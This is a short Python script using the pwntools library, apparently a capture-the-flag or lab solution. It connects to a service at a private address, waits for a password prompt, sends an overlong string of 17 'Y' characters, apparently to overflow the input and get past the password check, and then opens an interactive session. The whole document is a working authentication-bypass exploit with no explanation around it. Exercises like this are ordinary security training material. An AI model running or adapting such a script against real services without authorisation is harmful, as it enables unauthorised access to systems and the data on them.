from pwn import *

r = remote('192.168.0.13', 10004)

r.recvuntil(b'Please enter your password: ')
r.sendline('Y'*17)
r.interactive()